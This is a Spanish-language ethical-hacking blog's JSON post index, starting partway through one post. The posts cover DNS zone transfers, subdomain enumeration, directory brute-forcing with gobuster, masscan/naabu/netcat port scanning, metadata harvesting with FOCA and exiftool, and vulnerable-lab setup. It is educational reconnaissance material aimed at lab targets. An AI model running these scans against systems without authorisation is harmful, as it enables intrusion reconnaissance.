dnsutilsHay varias herramientas como por ejemplo:nslookupset type=nszonetransfer.mePodemos comprobar si nos envía el fichero de transferencia de zonaset type=anyls -d zonetransfer.meDice que el comando no está implementado por que realmente le estamos pidiendo que transfiera este archivo a una máquina host Kali Linux y esto no tendría sentido por motivos de seguridad.Esto mismo podemos intentarlo desde una máquina windows y nos saldrá el mismo error.Esto es por el mismo motivo que antes, estamos intentando iniciar una transferencia del fichero hacia ningún sitio porque el host o destino de la transferencia debería ser o está entendido para el DNS server que debe de ser otro DNS server y no cualquier máquina que le haga la petición.set type=anyserver nsztml.digi.ninjals -d zonetransfer.meUna de las cosas interesantes de estos ficheros de zona es que en muchas ocasiones, cuando ese DNS server está compartido entre la red interna y redes externas, podemos también tener algún tipo de configuración de servidores y direcciones internas.Otra herramienta en Linux DNSrecondnsrecon -d zonetrasfer.me -t axfrIdentificando SubdominiosFase de reconocimiento sobre la superficie de ataqueHay que tener en cuenta que normalmente la superficie de ataque a una aplicación web no se reduce a un solo dominio, sino a todos los subdominios que tenga asociados ya que se encuentran alojados juntos.Es muy común que en los subdominios haya menos medias de seguridad ya que las inversiones de mantenimiento y blindaje suelen ir dirigidas a webs principales o de acceso masivo ya que todo tiene un coste.O incluso la posibilidad de olvidar la existencia de uno por parte de la empresa.SubFinderhttps://github.com/projectdiscovery/subfinderDescubre subdominios validos de una web utilizando fuentes pasivas de información.sudo apt install subfinderVamos a probarla contra una web diseñada para eso.subfinder -d hackthissite.org &gt; output_subfinder.txtSubListerhttps://github.com/aboul3la/Sublist3rUtiliza python para recopilar información de subdominios utilizando OSINT, fuentes publicas de información.También implementa subbrute que enumera subdominios haciendo peticiones a nameServers públicos. Aunque es una herramienta más activa esta implementa OpenResolvers que permite hacer bypass a los rate limits de un name servers y proporciona un poco de “anonimato”sudo apt install sublist3rsublist3r -d hackthissite.org -vSe le puede indicar que haga un escaneo de los subdominios y además que indique cuales tienen ciertos puertos abiertos:sublister -d hackthissite.org -v -p 80,443El problema es el ruido que genera.Identificando tecnologíasTipo de aplicaciones, tecnologías, servidores, lenguajes de programación detrás de cada subdominioWhatWebhttps://github.com/urbanadventurer/WhatWebEscaner de aplicaciones web que analiza un dominio o subdominio y analiza sus tecnologías, librerías, versiones, direcciones de correo, errores sql, id de cuentas, wp-content. Vamos a analizar una web de la maquina VPLEPara listar los pluginswhatweb -lNo suele generar mucho tráfico de red y tiene opciones para controlarlo.Si usamos esta aplicación, al analizar las peticiones y las cabeceras de los paquetes no debería haber problema a la hora de usarlo contra una web con balanceador de carga.El balanceador se encargar de repartir las cargas de peticiones entre varios servidores o regiones.WebAnalyzehttps://github.com/rverton/webanalyzeEs algo más sencilla y rápida que WhatWeb, menos conocida pero da menos detalle.go install -v github.com/rverton/webanalyze/cmd/webanalyze@latestwebanalyze -updateContent DiscoverySi en las anteriores técnicas aun no hemos encontrado nada demasiado útil podemos analizar los contenidos.Se puede realizar de forma manual como un usuario pero normalmente esto que está de cara al público suele estar más securizado.Pero si hacemos un análisis más profundo puede haber archivos que se pueden estar sirviendo aunque no se referencien de cara al público y pueden ser más interesantes.Una cosa a tener en cuenta es que esta técnica es que claramente es más intrusiva porque interactuamos directamente con la aplicación y por tanto generamos tráfico.Dirbusterhttps://github.com/KajanM/DirBusterViene instalada por defecto en Kali. Trata de hacer fuerza bruta en un dominio que le indiquemos mediante un diccionario. Por defecto los diccionarios se encuentran en/usr/share/wordlists/dirbusterGobuster y seclistsEs una herramienta similar, más reciente y escrita en go.https://github.com/OJ/gobusterTambién incorpora fuerza bruta sobre subdominios, virtual hosts o buckets en amazon.sudo apt install gobusterAñadimos también mejores diccionariosgit clone https://github.com/danielmiessler/SecListsgobuster -hgobuster dir -u http://192.168.20.133:8080 -w /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txtTambién podemos buscar ficheros concretos por extensióngobuster dir -u http://192.168.20.133:8080 -w /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x pdf"
  },
  
  {
    "title": "Configuración de Metasploitable 3",
    "url": "/posts/metasploitable/",
    "categories": "Labs & CTF, Metasploitable",
    "tags": "metasploitable3, vmware, security-lab",
    "date": "2023-07-01 00:00:00 +0200",
    





    
    "snippet": "En esta guía veremos cómo configurar el entorno vulnerable Metasploitable 3, que consta de dos servidores: un servidor Ubuntu Linux y un Windows Server.Preparación InicialEste entorno vulnerable va...",
    "content": "En esta guía veremos cómo configurar el entorno vulnerable Metasploitable 3, que consta de dos servidores: un servidor Ubuntu Linux y un Windows Server.Preparación InicialEste entorno vulnerable va a estar formado por dos servidores, un primer servidor Linux, que se corresponderá con un Ubuntu y un segundo servidor Windows que se corresponderá con un Windows Server.El repositorio oficial del proyecto se encuentra en:https://github.com/rapid7/metasploitable3Vamos al siguiente enlace y descargamos las imágenes para nuestra versión de software que en este caso será vmware_desktop:https://app.vagrantup.com/rapid7/Con ambos archivos descargados les cambiamos la extensión a .zip. Al terminar la descompresión, con los archivos resultantes repetimos el proceso.Cambiamos el nombre a las carpetas y las movemos a nuestro directorio de máquinas virtuales para añadirlas a VMware.Vamos a configurar la red y algunas configuraciones más.Ubuntu            Usuario: vagrant      Password: vagrant      Configuramos una subred que en mi caso asigna a los nodos en 192.168.20.0Vamos a eliminar las reglas IPtables de la máquina que se tratan de un “firewall” implementado en máquinas linux para evitar problemas o limitaciones de conexión entre las máquinas.iptables -Ssudo iptables -FSi se reinicia la máquina puede que se vuelvan a añadir así que si existen problemas de conexión es conveniente revisar si existen o no estas reglas.WindowsAmbos usuarios tienen la contraseña “vagrant”. No está activada pero no importa y además pedirá reiniciar la máquina para instalar vmware tools.Añadimos la máquina a nuestra subred:vamos a las opciones de redCambiar opciones avanzadasActivamos todas las opcionesComprobamos conectividad entre las máquinas:"
  },
  
  {
    "title": "Anonimato",
    "url": "/posts/anonimato/",
    "categories": "Conceptos básicos, Privacidad",
    "tags": "anonymity, vpn, proxy, tor, privacy",
    "date": "2023-06-25 00:00:00 +0200",
    





    
    "snippet": "Conceptos básicosRelativos a redes de ordenadores y riesgos de seguridad a los que estamos expuestos por el simple hecho de estar conectados a InternetLa dirección IP y dirección MAC de los disposi...",
    "content": "Conceptos básicosRelativos a redes de ordenadores y riesgos de seguridad a los que estamos expuestos por el simple hecho de estar conectados a InternetLa dirección IP y dirección MAC de los dispositivos que tenemos conectados a nuestra red doméstica/privada (incluidas las máquinas virtuales) no están directamente expuestas a Internet.Para conectarnos a Internet necesitamos un dispositivo denominado router, que, de manera genérica, conecta nuestra red doméstica/privada con otras redes de las que se compone Internet. Todos los dispositivos que tenemos conectados a nuestra red doméstica/privada tienen una dirección IP privada que solo es accesible por otros dispositivos conectados a esta misma red.Por lo tanto, para poder conectarse a internet, tienen que hacerlo a través del router, que tiene una dirección ip pública concreta que utilizarán todos los sistemas informáticos que tengamos conectados a nuestra red privada.¿Dónde entra el concepto de anonimato?Utilizando algún método para garantizar el anonimato como puede ser una VPN, un proxy, red tor… de manera genérica lo que estamos haciendo es tunelizar nuestro tráfico de red aplicando algún tipo de cifrado desde una máquina en nuestra red doméstica/local hasta un servidor en Internet que se encargará de descifrar el tráfico y realizar la petición a donde nosotros queramos dirigirla.Es importante entender, que aunque el contenido del tráfico de red vaya cifrado, ese tráfico de red sigue pasando por nuestro router para poder llegar al servidor que lo descifra y, por lo tanto, nuestro router sigue estando expuesto a Internet.¿Qué es lo que tratamos de conseguir con las técnicas que intentar garantizar el anonimato en Internet?Con este tipo de técnicas y herramientas tratamos de garantizar la privacidad y confidencialidad de nuestras conexiones. De esta manera, cuando nos conectamos a una máquina en Internet, por ejemplo un servidor de aplicación que proporciona una página web, lo hacemos a través de una o varias máquinas intermedias con las que establecemos una comunicación cifrada.Las máquinas que se utilizan para salir a internet cuando utilizas mecanismos de anonimato como una VPN, tienen que descifrar tu tráfico de red y, por lo tanto, pueden monitorizar y registrarlo. Conocen lo que estás haciendo y también el origen de la conexión. Si utilizas un servicio gratuito de proxy, VPN… que te encuentres por Internet, es posible que incluso te estén monitorizando y puedan llegar a robarte información.La opción más sencilla es utilizar un proxy. Si utilizas un proxy gratuito y público ten en cuenta que en esa máquina de destino por la que estas saliendo a Internet pueden estar monitorizando tu navegación.Otro de los mecanismos más comunes es utilizar una VPN. Existen muchos servicios de VPN gratuitos, por mi experiencia personal, os recomiendo ProtonVPN. Este servicio tiene una versión gratuita que podéis utilizar de manera segura.Aunque es menos popular, podéis conectaros a Internet a través de la Red Tor, esto garantiza que los nodos de salida a Internet pertenezcan a esta red y, por lo tanto, su dirección ip pública sea diferente a la tuya. En este caso también debes tener en cuenta que mucha gente utiliza este mecanismos y sus direcciones ip públicas están bloqueadas frecuentemente por los buscadores más populares como Google.Podéis establecer vuestra propia máquina de salto en la nube. Puedes crear una cuenta gratuita de AWS (Amazon Web Services) y crear una máquina (instancia) en la nube que puedes utilizar de máquina de salto para conectarte a Internet y hacer las peticiones a través de ella, sería muy similar a tener tu proxy personal."
  },
  
  {
    "title": "IMPORTANCIA DE LAS METODOLOGÍAS",
    "url": "/posts/metodologia/",
    "categories": "Conceptos básicos, Metodologías",
    "tags": "pentesting, hacking-etico, metodologias, osstmm, ptes, issaf, owasp",
    "date": "2023-06-23 00:00:00 +0200",
    





    
    "snippet": "Metodologías principalesLas metodologías nos facilitan la realización de un conjunto de actividades en un orden determinado y estableciendo una prioridad adecuada para intentar garantizar el éxito ...",
    "content": "Metodologías principalesLas metodologías nos facilitan la realización de un conjunto de actividades en un orden determinado y estableciendo una prioridad adecuada para intentar garantizar el éxito y alcanzar un objetivo final.Metodologías de referencia      OSSTMM (Open-Source Security Testing Methodology Manual).        The Penetration Testing Execution Standard.        ISSAF (Information Systems Security Assessment Framework).        OTP (OWASP Testitng Project).  Fases principales      Definición del alcance del test de penetración        Recopilación de información        Identificación y análisis de vulnerabilidades        Explotación de las vulnerabilidades        Post-explotación        Elaboración de un documento de reporte  Definición del alcance del hacking éticoAntes de realizar ninguna acción, discutir con el cliente las tareas que llevará a cabo el analista durante el Hacking Ético, así como los roles y responsabilidades de ambos.Asegurar mediante contrato firmado que las acciones que se llevan a cabo son en representación del clienteAnálisis de las políticas de la organización que definen el uso que los usuarios hacen de los sistemas y de la infraestructuraProcedimiento en el caso de que se localice una intrusión por un terceroRecursos útilesRepositorio de informes de auditoríaEl primer recurso es un repositorio donde podéis encontrar cientos de reportes de auditorías reales de diferentes empresas del sector del Hacking Ético y de la Ciberseguridad que se han ido recopilando a lo largo del tiempo. Tenéis informes de todo tipo y que recogen una diversidad muy grande de auditorías:https://github.com/juliocesarfort/public-pentesting-reportsPlantillas de informesEl segundo recurso se corresponde con diferentes plantillas que podéis utilizar para comenzar a elaborar vuestro propio informe de Hacking Ético o auditoría de seguridad e ir mortificándolo para que se adapte a vuestras necesidades:  https://pentestreports.com/templates/  https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report"
  },
  
  {
    "title": "Configuración de VPLE (Vulnerable Pentesting Lab Environment)",
    "url": "/posts/vple/",
    "categories": "Labs & CTF, VPLE",
    "tags": "vple, pentesting, security-lab, vulnerable-apps",
    "date": "2023-06-12 00:00:00 +0200",
    





    
    "snippet": "Preparar el entornoLa máquina virtual VPLE está disponible en:https://www.vulnhub.com/entry/vulnerable-pentesting-lab-environment-1,737/Es una máquina que implementa múltiples aplicaciones web vuln...",
    "content": "Preparar el entornoLa máquina virtual VPLE está disponible en:https://www.vulnhub.com/entry/vulnerable-pentesting-lab-environment-1,737/Es una máquina que implementa múltiples aplicaciones web vulnerables:  Web-dvwa (eg.123.123.123.123:1335/)  Mutillidae (eg.123.123.123.123:1336/)  Webgoat (eg.123.123.123.123:1337/WebGoat/)  Bwapp (eg.123.123.123.123:8080/install.php &amp; 123.123.123.123:8080/install.php)  Juice-shop (eg.123.123.123.123:3000/)  Security-ninjas (eg.123.123.123.123:8899/)  Wordpress (eg.123.123.123.123:8800/)Una vez la importemos la conectamos a la red privada de VMWare.A partir de aquí podemos ir navegando las diferente paginas vulnerables que ofrece desde el navegador."
  },
  
  {
    "title": "Metadatos",
    "url": "/posts/metadatos_foca/",
    "categories": "Reconocimiento, Metadata",
    "tags": "metadata, reconnaissance, osint",
    "date": "2023-06-07 02:00:00 +0200",
    





    
    "snippet": "Recopilación semi-pasiva de informaciónRecolección de información sobre un objetivo determinado utilizando métodos que se asimilen al tráfico de red y comportamiento normal que suele recibir.Dentro...",
    "content": "Recopilación semi-pasiva de informaciónRecolección de información sobre un objetivo determinado utilizando métodos que se asimilen al tráfico de red y comportamiento normal que suele recibir.Dentro del alcance se encuentran actividades como: ⇒Consultas a servidores DNS ⇒Acceso a recursos internos de las aplicaciones web ⇒Análisis de metadatos de documentosQuedan fuera de alcance todas las actividades que generen un comportamiento anómaloLa diferencia principal con las técnicas de reconocimiento anteriores que eran completamente pasivas es que no generábamos ningún tipo de tráfico o interacción directa con la infraestructura o servicio.Las siguientes técnicas si que van a intercambiar cierto tráfico de red con el objetivo pero de forma no intrusiva sin generar comportamientos anómalos.MetadatosFOCAEsta técnica se denomina extracción de metadatos, que se tratan de una serie de datos que describen otros datos como PDF, word, etc.Estos metadatos describen cosas como el autor, el fecha de creación, software utilizado e incluso el equipo en el que se ha creado.Esta información nos va a ser muy útil porque si conseguimos recaudar este tipo de datos que estén públicos con alguno de los métodos de recopilación antes vistos, podemos llegar a nombres de usuario, correos, versiones de sistemas y software que podemos usar para buscar entradas o vulnerabilidades de nuestro objetivo.La herramienta que vamos a estar usando ahora se trata de FOCA. Funciona únicamente en sistemas operativos windows.https://github.com/ElevenPaths/FOCAHay que tener en cuenta se necesitan las siguientes herramientas adicionales para su usohttps://www.microsoft.com/es-es/sql-server/sql-server-downloadsSeleccionamos la básicaUna vez instalado tenemos que tener el cuenta el nombre de la instalación que por defecto es localhost.Iniciamos FOCA y le indicamos la localización de la base de datos.Una vez abierto este apartado será el más interesante ya que es el que gestiona los metadatos de los ficheros que queramos.Una vez tengamos el archivo que queramos analizar pulsamos click derecho en el apartado anterior y añadimos fichero.Para evitar tener que ir archivo por archivo foca nos proporciona una herramienta de proyectos.Indicamos el dominio o subdominiosY le indicamos que tipo de ficheros y qué motores de busqueda quieres usarSeleccionamos los que nos interesen y descargamos los documentos a la máquinaOtras herramientasMetagofilEs una herramienta algo más antigua y menos completa que FOCA.sudo apt install metagoofilmetagoofil -d dominio -l 10 -t pdf,doc,txt -o Desktop/ MetaShieldSu función principal es eliminar posibles metadatos sensibles de documentos que se vayan a compartir.https://metashieldclean-up.elevenpaths.com/ExifToolsudo apt install exiftoolexiftool -f *.pdf | egrep -i \"Author|Creator|Email|Producer|Templeate\" | sort -uRecorre todos los archivos pdf que tengamos y busca una serie de campos para devolver el resultado."
  },
  
  {
    "title": "DNS",
    "url": "/posts/dns/",
    "categories": "Reconocimiento, DNS",
    "tags": "network, reconnaissance, dns",
    "date": "2023-06-07 02:00:00 +0200",
    





    
    "snippet": "Características principales y funciónes genéricasDNS es el acrónimo de Domain Name SystemRealiza una traducción de nombres de dominio a direcciones IPSe corresponde con uno de los protocolos más im...",
    "content": "Características principales y funciónes genéricasDNS es el acrónimo de Domain Name SystemRealiza una traducción de nombres de dominio a direcciones IPSe corresponde con uno de los protocolos más importantes de internetEste tipo de traducción se realiza para poder recordar con más facilidad las webs a las que se accede mediante texto legible o relacionado con el servicio o contenido de la aplicación web.Este protocolo nos interesa por→ Obtener información pública sobre un dominio o una organización→ Descubrir relaciones entre dominios y hosts→ Técnicas de explotación específicas para ganar acceso como DNS Spoofing.Funcionamiento de DNSDNS Zone: Agrupación de registros (datos) DNSAgrupación de datos relacionados con mismo dominio en particular cuyo mantenimiento queda delegado a una organización o individuo en concreto.Estas DNS Zones contienen diferentes tipos de registrosDesde el usuario se solicita la dirección IP al nombre de dominio que deseamos buscar como google.com por ejemplo.Le mandamos la petición a un local DNS resolver que tenemos configurado por defecto en nuestros equipos. Normalmente este servidor no tiene la dirección IP a no ser que ya hayamos accedido antes y la tenga cacheada.Este DNS resolver si no tiene la IP comienza un búsqueda recursiva con relación a otros servidores DNS a ver si ellos conocen la IP.Pregunta al DNS root name server que le redirige al siguiente servidor DNS en función de la terminación del dominio que busquemos .com / .org / .es / etc…Este lo reenvia a un Servidor de DNS top-level con el TLD .comEste servidor DNS lo reenvia al servidor de DNS que aloja la dirección de google.com, el Authoritative DNS server.Este Authoritative DNS server ahora si nos indica la IP del dominio google.com y nos la devuelve.¿Cómo utilizar esto a nuestro favor?Consultando de forma legítima estos servidores previos al web server para ver que información tienen sobre el dominio objetivo como subdominios, correos, nombres, etcTambién podremos hacer DNS spoofing al servidor DNS localCentralOps/DNSdumpsterLas técnicas son muy sencillas que simplemente consisten en consultar toda la información de los diferentes DNS servers para un dominio concreto.https://centralops.net/co/Otra aplicación web mas completa puede serhttps://dnsdumpster.com/La mejor parte de esta herramienta es el grafo"
  },
  
  {
    "title": "Masscan",
    "url": "/posts/masscan/",
    "categories": "Reconocimiento, Masscan",
    "tags": "network, scanning, masscan",
    "date": "2023-06-07 02:00:00 +0200",
    





    
    "snippet": "En este caso no tratamos con técnicas para evitar detección en el escaneo sino tratar de escanear el mayor numero de sistemas en el menor tiempo posiblehttps://github.com/robertdavidgraham/masscanE...",
    "content": "En este caso no tratamos con técnicas para evitar detección en el escaneo sino tratar de escanear el mayor numero de sistemas en el menor tiempo posiblehttps://github.com/robertdavidgraham/masscanEste es un escáner de puertos a escala de Internet. Puede escanear todo Internet en menos de 5 minutos, transmitiendo 10 millones de paquetes por segundo desde una única máquina.Para poder usar esta herramienta no podemos hacerlo en una red virtual de VMWARE como hasta ahora así asignaremos la interfaz de red a NAT en VMWare y reasignaremos la ip en kali.sudo dhclientRealizar reconocimiento de la infraestructura actual sin importar medidas de seguridad:ifconfig sudo nmap -sS 129.168.115.0/24Masscan no se utiliza para escanear 1 sola maquina sino muchas maquinas que se encuentren dentro de una red grande de forma eficiente y rápida.sudo masscan 192.168.115.0/24 -p80 --interface eth0De forma por defecto masscan tiene un limite de paquetes establecido a 100 por segundo pero se puede modificar el rate.sudo masscan 192.168.115.0/24 -p80 --interface eth0 --rate 10000Lo que genera un volumen de red absurdo pero realiza un escaneo casi inmediato.Para un rango de puertos:sudo masscan 192.168.115.0/24 -p1-10000 --interface eth0Lo que escaneará ese rango de puertos pero la ventaja de esta herramienta es que se puede pausar con CTRL+C  y guarda la info en un archivo llamado paused.conf.Con el que más tarde se puede reiniciar el escaneo por donde lo dejó:sudo masscan --resume paused.confSi se produce un fallo al intentar retomar el escaneo debemos instalar la herramienta desde su repositorio.sudo apt remove masscansudo apt-get --assume-yes install git make gccgit clone https://github.com/robertdavidgraham/masscancd masscanmakeUna de las opciones mas interesantes es indicar la subred y seleccionar un escaneo de puertos mas comunes:sudo masscan 192.168.115.0/24 --top-ports 100 --interface eth0 --rate 10000"
  },
  
  {
    "title": "Naabu y Netcat",
    "url": "/posts/naabu_netcat/",
    "categories": "Reconocimiento, Naabu & Netcat",
    "tags": "network, scanning, naabu, netcat",
    "date": "2023-06-07 02:00:00 +0200",
    





    
    "snippet": "NaabuEs posible que al ser NMAP la herramienta de reconocimiento de redes más usada y potente algunas IDS y sistemas de seguridad estén bien orientados hacia los métodos que usa y evitar así posibl...",
    "content": "NaabuEs posible que al ser NMAP la herramienta de reconocimiento de redes más usada y potente algunas IDS y sistemas de seguridad estén bien orientados hacia los métodos que usa y evitar así posibles intrusiones por lo que a veces es recomendado utilizar otras opcioneshttps://github.com/projectdiscoveryEsta herramienta pertenece a ProjectDiscovery que tienen varias soluciones y herramientas opensource muy interesantes. Naabu es una herramienta de escaneo de puertos escrita en Go que te permite enumerar de manera rápida y confiable los puertos válidos para hosts. Es una herramienta bastante simple que realiza escaneos rápidos de SYN/CONNECT/UDP en el host o lista de hosts y enumera todos los puertos que devuelven una respuesta.sudo apt-get install naabunaabu 192.168.20.0/24Es una herramienta menos completa que NMAP pero que igualmente es útil y es conveniente tenerla en cuentaNetcatDe igual manera también podemos hacer un escaneo manual de los puertos con NETCAT. Netcat es la “navaja suiza” en herramientas de hacking porque permite recibir conexiones de red y establecer conexión de red con un nodo en la misma red.netcat -nv 192.168.20.130 80 -n → no resolución DNS -v → verbose De esta forma podemos manualmente emitir pequeños paquetes a direcciones concretas en puertos concretos. Podemos realizar un escaneo de puertos de forma activa ya sabiendo el HOST objetivo pero con ciertas precauciones.netcat -nvw2 192.168.20.128 1-100-w2 → timetout para las conexiones De nuevo escanear de forma mas comedida levantará menos alertas. Para extraer el servicio del puerto en concreto:netcat -nv 192.168.20.128 21Esto no alertará porque es un request normal y no es sospechoso. De igual forma podemos reconocer que host están activos de la siguiente forma:netcat -nv 192.168.20.128 90En este caso el puerto no esta activo por lo que no existe pero si ejecutamos el comando y capturamos con wireshark veremos que:El host responderá de vuelta con un reset indicando que en ese puerto no está activo pero si hace un reset del TCP significa que el host está activo."
  },
  
  {
    "title": "AMap",
    "url": "/posts/amap/",
    "categories": "Reconocimiento, Amap",
    "tags": "amap, nmap, escaneo, puertos",
    "date": "2023-06-07 00:00:00 +0200",
    





    
    "snippet": "AMap es una alternativa a NMAP algo menos completa pero nos sirve para contrastar resultados.Instalación y uso básicosudo apt install amapsudo nmap -v --reason -sS -oA servicios.amap 192.168.20.128...",
    "content": "AMap es una alternativa a NMAP algo menos completa pero nos sirve para contrastar resultados.Instalación y uso básicosudo apt install amapsudo nmap -v --reason -sS -oA servicios.amap 192.168.20.128Análisis de bannersamap -i servicios.amap.gnmap -BLo que hace a AMap es tratar de consultar los diferentes puertos que tenemos abiertos en búsqueda de ese banner y nos muestra por pantalla el banner de manera que podamos identificar nosotros qué tipo de servicio es."
  },
  
  {
    "title": "Osint Tools Collection",
    "url": "/posts/osint_tools/",
    "categories": "OSINT, Tools",
    "tags": "osint, security, investigation, tools, recopilacion",
    "date": "2023-05-10 00:00:00 +0200",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "Recopilación de documentos",
    "url": "/posts/recopilacion/",
    "categories": "Recopilación",
    "tags": "hacking hético, security, investigation, documentos, herramientas",
    "date": "2023-05-10 00:00:00 +0200",
    





    
    "snippet": "",
    "content": ""
  }
  
]

